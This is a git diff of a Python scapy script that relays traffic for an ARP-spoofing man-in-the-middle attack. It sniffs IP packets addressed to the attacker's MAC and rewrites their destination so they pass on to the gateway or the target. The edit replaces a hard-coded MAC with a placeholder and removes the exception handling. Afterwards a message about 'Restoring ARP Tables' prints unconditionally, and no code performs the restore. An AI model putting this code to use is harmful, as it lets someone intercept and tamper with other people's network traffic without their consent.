@@ -25,21 +25,23 @@ def get_system_ip():
 arguments = get_arguments()
 filter = "ip"
 My_ip = get_system_ip()
-My_mac = "20:4E:F6:AD:6B:65"
+My_mac = "##your_mac_addr##"
 
-try:
-    gateway_mac = get_mac(arguments.gateway)
-    target_mac = get_mac(arguments.target)
+gateway_mac = get_mac(arguments.gateway)
+target_mac = get_mac(arguments.target)
 
-    def redirecting(packet):
-        if ((packet[scapy.IP].dst == arguments.gateway) and (packet[scapy.Ether].dst == My_mac)):
-            packet[scapy.Ether].dst = gateway_mac
-        elif((packet[scapy.IP].dst == arguments.target) and (packet[scapy.Ether].dst == My_mac)):
-            packet[scapy.Ether].dst = target_mac
+def redirecting(packet):
+    if ((packet[scapy.IP].dst == arguments.gateway) and (packet[scapy.Ether].dst == My_mac)):
+        packet[scapy.Ether].dst = gateway_mac
         scapy.sendp(packet,verbose=False)
+        return
+    elif((packet[scapy.IP].dst == arguments.target) and (packet[scapy.Ether].dst == My_mac)):
+        packet[scapy.Ether].dst = target_mac
+        scapy.sendp(packet,verbose=False)
+        return
 
-    scapy.sniff(prn = redirecting, filter = filter, store = 0)
+scapy.sniff(prn = redirecting, filter = filter, store = 0)
 
-except KeyboardInterrupt:
-    print("\n[-] Ctrl + C detected.....Restoring ARP Tables Please Wait!")
-    sys.exit(0)
+
+print("\n[-] Ctrl + C detected.....Restoring ARP Tables Please Wait!")
+sys.exit(0)
